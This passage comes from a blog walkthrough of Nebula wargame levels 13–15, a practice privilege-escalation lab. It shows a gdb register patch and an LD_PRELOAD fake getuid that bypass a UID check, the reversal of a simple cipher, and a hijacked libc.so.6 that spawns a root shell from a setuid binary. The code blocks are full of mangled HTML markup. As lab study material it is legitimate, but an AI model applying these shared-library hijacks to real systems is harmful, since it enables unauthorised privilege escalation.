<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">unistd</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">sys</span><span class="o">/</span><span class="n">types</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">string</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">define</span> <span class="n">FAKEUID</span> <span class="mi">1000</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">envp</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">c</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">token</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">if</span><span class="p">(</span><span class="n">getuid</span><span class="p">()</span> <span class="o">!=</span> <span class="n">FAKEUID</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Security</span> <span class="n">failure</span> <span class="n">detected</span><span class="p">.</span> <span class="n">UID</span> <span class="o">%</span><span class="n">d</span> <span class="n">started</span> <span class="n">us</span><span class="p">,</span> <span class="n">we</span> <span class="n">expect</span> <span class="o">%</span><span class="n">d</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">getuid</span><span class="p">(),</span> <span class="n">FAKEUID</span><span class="p">);</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">The</span> <span class="n">system</span> <span class="n">administrators</span> <span class="n">will</span> <span class="n">be</span> <span class="n">notified</span> <span class="n">of</span> <span class="n">this</span> <span class="n">violation</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'>      <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="c1">// snip, sorry :)&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">your</span> <span class="n">token</span> <span class="n">is</span> <span class="o">%</span><span class="n">s</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">token</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level13@nebula:/home/flag13$ objdump -M intel flag13 -d | grep 0x3e8
</span><span class='line'> 80484f4:       3d e8 03 00 00          cmp    eax,0x3e8
</span><span class='line'> 8048505:       c7 44 24 08 e8 03 00    mov    DWORD PTR [esp+0x8],0x3e8</span></code></pre></td></tr></table></div></figure></p>

<p>Because we know where the value 0x3e8 = 1000 is used to compare with eax, now
we need only to tamper this value:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level13@nebula:/home/flag13$ gdb ./flag13 -q
</span><span class='line'>Reading symbols from /home/flag13/flag13&hellip;(no debugging symbols found)&hellip;done.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>(gdb) set disassembly-flavor intel&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>(gdb) b *0x80484f4
</span><span class='line'>Breakpoint 1 at 0x80484f4&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>(gdb) r
</span><span class='line'>Starting program: /home/flag13/flag13
</span><span class='line'>Breakpoint 1, 0x080484f4 in main ()&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>(gdb) i r eax
</span><span class='line'>eax            0x3f6    1014&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>(gdb) set $eax = 1000&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>(gdb) i r eax
</span><span class='line'>eax            0x3e8    1000&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>(gdb) c
</span><span class='line'>Continuing.
</span><span class='line'>your token is b705702b-76a8-42b0-8844-3adabbe5ac58&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>level13@nebula:/home/flag13$ su flag13
</span><span class='line'>Password:
</span><span class='line'>sh-4.2$ getflag
</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure></p>

<p>As another solution we use the PRELOAD library. We use the copy of flag13,
because the restriction with invoking preload with suid binaries.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level13@nebula:/tmp$ cat fakeuid.c&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>include &lt;sys/types.h>&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>uid_t getuid(void) { return 1000; }&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>level13@nebula:/tmp$ gcc -shared -fPIC fakeuid.c -o fakeuid.so&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>level13@nebula:/tmp$ cp /home/flag13/flag13 .&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>level13@nebula:/tmp$ LD_PRELOAD=./fakeuid.so ./flag13
</span><span class='line'>your token is b705702b-76a8-42b0-8844-3adabbe5ac58</span></code></pre></td></tr></table></div></figure></p>

<h2>Level14</h2>

<p>The encryption process is trivial, on each byte position, the
/home/flag14/flag14 add the position index to the ascii value of the character,
started by 0, see:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level14@nebula:/home/flag14$ ruby -e &lsquo;print &ldquo;\x01\x02\x03\x04&rdquo;&rsquo; | ./flag14 -e | hexdump -C
</span><span class='line'>00000000  01 03 05 07                                       |&hellip;.|
</span><span class='line'>00000004
</span><span class='line'>level14@nebula:/home/flag14$ ruby -e &lsquo;print &ldquo;\xff\xff\xff\xff&rdquo;&rsquo; | ./flag14 -e | hexdump -C
</span><span class='line'>00000000  ff 00 01 02                                       |&hellip;.|
</span><span class='line'>00000004</span></code></pre></td></tr></table></div></figure></p>

<p>Now we use the reverse process to decrypt the token:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">level14@nebula:/home/flag14$</span> ruby -pe <span class="p">&amp;</span>lsquo<span class="p">;</span>puts <span class="nv">$_</span><span class="o">[</span>0..-3<span class="o">]</span>.force_encoding<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span>iso-8859-1<span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span>.split<span class="o">(</span>//<span class="o">)</span>.each_with_index.map <span class="o">{</span><span class="p">|</span>x,i<span class="p">|</span> <span class="o">(</span>x.ord-i<span class="o">)</span>.chr<span class="o">}</span>.join<span class="p">&amp;</span>rsquo<span class="p">;</span> <span class="p">&amp;</span>lt<span class="p">;</span> token
</span><span class='line'><span class="go">8457c118-887c-4e40-a5a6-33a25353165</span>
</span><span class='line'><span class="go">857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="go">&lt;p&gt;level14@nebula:/home/flag14$ su flag14</span>
</span><span class='line'><span class="go">Password:&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="go">&lt;p&gt;sh-4.2$ getflag</span>
</span><span class='line'><span class="go">You have successfully executed getflag on a target account</span>
</span></code></pre></td></tr></table></div></figure></p>

<h2>Level15</h2>

<p>From strace output we can see that the binary is trying to link shared library from <code>/var/tmp/flag15</code> directory:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">level15@nebula:/tmp$</span> strace -f /home/flag15/flag15
</span><span class='line'><span class="go">execve(&amp;ldquo;/home/flag15/flag15&amp;rdquo;, [&amp;ldquo;/home/flag15/flag15&amp;rdquo;], [/&lt;em&gt; 21 vars &lt;/em&gt;/]) = 0</span>
</span><span class='line'><span class="go">brk(0)                                  = 0x8b1f000</span>
</span><span class='line'><span class="go">access(&amp;ldquo;/etc/ld.so.nohwcap&amp;rdquo;, F_OK)      = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb784c000</span>
</span><span class='line'><span class="go">access(&amp;ldquo;/etc/ld.so.preload&amp;rdquo;, R_OK)      = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">open(&amp;ldquo;/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6&amp;rdquo;, O_RDONLY) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">stat64(&amp;ldquo;/var/tmp/flag15/tls/i686/sse2/cmov&amp;rdquo;, 0xbf8a8bb4) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">open(&amp;ldquo;/var/tmp/flag15/tls/i686/sse2/libc.so.6&amp;rdquo;, O_RDONLY) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">stat64(&amp;ldquo;/var/tmp/flag15/tls/i686/sse2&amp;rdquo;, 0xbf8a8bb4) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">open(&amp;ldquo;/var/tmp/flag15/tls/i686/cmov/libc.so.6&amp;rdquo;, O_RDONLY) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">stat64(&amp;ldquo;/var/tmp/flag15/tls/i686/cmov&amp;rdquo;, 0xbf8a8bb4) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">open(&amp;ldquo;/var/tmp/flag15/tls/i686/libc.so.6&amp;rdquo;, O_RDONLY) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">stat64(&amp;ldquo;/var/tmp/flag15/tls/i686&amp;rdquo;, 0xbf8a8bb4) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">open(&amp;ldquo;/var/tmp/flag15/tls/sse2/cmov/libc.so.6&amp;rdquo;, O_RDONLY) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">stat64(&amp;ldquo;/var/tmp/flag15/tls/sse2/cmov&amp;rdquo;, 0xbf8a8bb4) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">open(&amp;ldquo;/var/tmp/flag15/tls/sse2/libc.so.6&amp;rdquo;, O_RDONLY) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">stat64(&amp;ldquo;/var/tmp/flag15/tls/sse2&amp;rdquo;, 0xbf8a8bb4) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">open(&amp;ldquo;/var/tmp/flag15/tls/cmov/libc.so.6&amp;rdquo;, O_RDONLY) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">stat64(&amp;ldquo;/var/tmp/flag15/tls/cmov&amp;rdquo;, 0xbf8a8bb4) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">open(&amp;ldquo;/var/tmp/flag15/tls/libc.so.6&amp;rdquo;, O_RDONLY) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">stat64(&amp;ldquo;/var/tmp/flag15/tls&amp;rdquo;, 0xbf8a8bb4) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">open(&amp;ldquo;/var/tmp/flag15/i686/sse2/cmov/libc.so.6&amp;rdquo;, O_RDONLY) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">stat64(&amp;ldquo;/var/tmp/flag15/i686/sse2/cmov&amp;rdquo;, 0xbf8a8bb4) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">open(&amp;ldquo;/var/tmp/flag15/i686/sse2/libc.so.6&amp;rdquo;, O_RDONLY) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">stat64(&amp;ldquo;/var/tmp/flag15/i686/sse2&amp;rdquo;, 0xbf8a8bb4) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">open(&amp;ldquo;/var/tmp/flag15/i686/cmov/libc.so.6&amp;rdquo;, O_RDONLY) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">stat64(&amp;ldquo;/var/tmp/flag15/i686/cmov&amp;rdquo;, 0xbf8a8bb4) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">open(&amp;ldquo;/var/tmp/flag15/i686/libc.so.6&amp;rdquo;, O_RDONLY) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">stat64(&amp;ldquo;/var/tmp/flag15/i686&amp;rdquo;, 0xbf8a8bb4) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">open(&amp;ldquo;/var/tmp/flag15/sse2/cmov/libc.so.6&amp;rdquo;, O_RDONLY) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">stat64(&amp;ldquo;/var/tmp/flag15/sse2/cmov&amp;rdquo;, 0xbf8a8bb4) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">open(&amp;ldquo;/var/tmp/flag15/sse2/libc.so.6&amp;rdquo;, O_RDONLY) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">stat64(&amp;ldquo;/var/tmp/flag15/sse2&amp;rdquo;, 0xbf8a8bb4) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">open(&amp;ldquo;/var/tmp/flag15/cmov/libc.so.6&amp;rdquo;, O_RDONLY) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">stat64(&amp;ldquo;/var/tmp/flag15/cmov&amp;rdquo;, 0xbf8a8bb4) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">open(&amp;ldquo;/var/tmp/flag15/libc.so.6&amp;rdquo;, O_RDONLY) = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">stat64(&amp;ldquo;/var/tmp/flag15&amp;rdquo;, 0xbf8a8bb4)   = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">open(&amp;ldquo;/etc/ld.so.cache&amp;rdquo;, O_RDONLY)      = 3</span>
</span><span class='line'><span class="go">fstat64(3, {st_mode=S_IFREG|0644, st_size=33815, &amp;hellip;}) = 0</span>
</span><span class='line'><span class="go">mmap2(NULL, 33815, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7843000</span>
</span><span class='line'><span class="go">close(3)                                = 0</span>
</span><span class='line'><span class="go">access(&amp;ldquo;/etc/ld.so.nohwcap&amp;rdquo;, F_OK)      = -1 ENOENT (No such file or directory)</span>
</span><span class='line'><span class="go">open(&amp;ldquo;/lib/i386-linux-gnu/libc.so.6&amp;rdquo;, O_RDONLY) = 3</span>
</span><span class='line'><span class="go">read(3, &amp;ldquo;\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\222\1\0004\0\0\0&amp;rdquo;&amp;hellip;, 512) = 512</span>
</span><span class='line'><span class="go">fstat64(3, {st_mode=S_IFREG|0755, st_size=1544392, &amp;hellip;}) = 0</span>
</span><span class='line'><span class="go">mmap2(NULL, 1554968, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x110000</span>
</span><span class='line'><span class="go">mmap2(0x286000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x176) = 0x286000</span>
</span><span class='line'><span class="go">mmap2(0x289000, 10776, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x289000</span>
</span><span class='line'><span class="go">close(3)                                = 0</span>
</span><span class='line'><span class="go">mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7842000</span>
</span><span class='line'><span class="go">set_thread_area({entry_number:-1 -&gt; 6, base_addr:0xb78428d0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0</span>
</span><span class='line'><span class="go">mprotect(0x286000, 8192, PROT_READ)     = 0</span>
</span><span class='line'><span class="go">mprotect(0x8049000, 4096, PROT_READ)    = 0</span>
</span><span class='line'><span class="go">mprotect(0x46b000, 4096, PROT_READ)     = 0</span>
</span><span class='line'><span class="go">munmap(0xb7843000, 33815)               = 0</span>
</span><span class='line'><span class="go">fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), &amp;hellip;}) = 0</span>
</span><span class='line'><span class="go">mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb784b000</span>
</span><span class='line'><span class="go">write(1, &amp;ldquo;strace it!\n&amp;rdquo;, 11strace it!</span>
</span><span class='line'><span class="go">)            = 11</span>
</span><span class='line'><span class="go">exit_group(11)                          = ?</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>We try to provide this library (in <code>/var/tmp/flag15/libc.so.6</code>):
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">level15@nebula:/tmp$</span> cat libc.so.6.c
</span><span class='line'><span class="go">void f(void *a) {}&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="go">&lt;p&gt;level15@nebula:/tmp$ mkdir /var/tmp/flag15&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="go">&lt;p&gt;level15@nebula:/tmp$ gcc -shared libc.so.6.c -o /var/tmp/flag15/libc.so.6&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="go">&lt;p&gt;level15@nebula:/tmp$ /home/flag15/flag15</span>
</span><span class='line'><span class="go">/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)</span>
</span><span class='line'><span class="go">/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)</span>
</span><span class='line'><span class="go">/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol __cxa_finalize, version GLIBC_2.1.3 not defined in file libc.so.6 with link time reference</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>There is an error, because we are linking using GLIBC_2.1.3, but in the binary, there are two symbols with GLIBC_2.0 undefined:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level15@nebula:/tmp$ nm /home/flag15/flag15  | grep &ldquo;.*U&rdquo;
</span><span class='line'>         U __libc_start_main@@GLIBC_2.0
</span><span class='line'>         U puts@@GLIBC_2.0</span></code></pre></td></tr></table></div></figure></p>

<p>We provide version script to the linker, link statically and try the same thing again.
<figure class='code'><figcaption><span>version.map </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="go">GLIBC_2.0   {};</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><figcaption><span>libc.so.6.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">__libc_start_main</span><span class="p">(</span><span class="kt">int</span> <span class="p">(</span><span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">main</span><span class="p">)</span> <span class="p">(</span><span class="kt">int</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="p">),</span> <span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="o">*</span> <span class="n">ubp_av</span><span class="p">,</span> <span class="kt">void</span> <span class="p">(</span><span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">init</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span><span class="p">),</span> <span class="kt">void</span> <span class="p">(</span><span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">fini</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span><span class="p">),</span> <span class="kt">void</span> <span class="p">(</span><span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">rtld_fini</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span><span class="p">),</span> <span class="kt">void</span> <span class="p">(</span><span class="o">*</span> <span class="n">stack_end</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>  <span class="n">setreuid</span><span class="p">(</span><span class="n">geteuid</span><span class="p">(),</span><span class="n">geteuid</span><span class="p">());</span>
</span><span class='line'>  <span class="n">execve</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
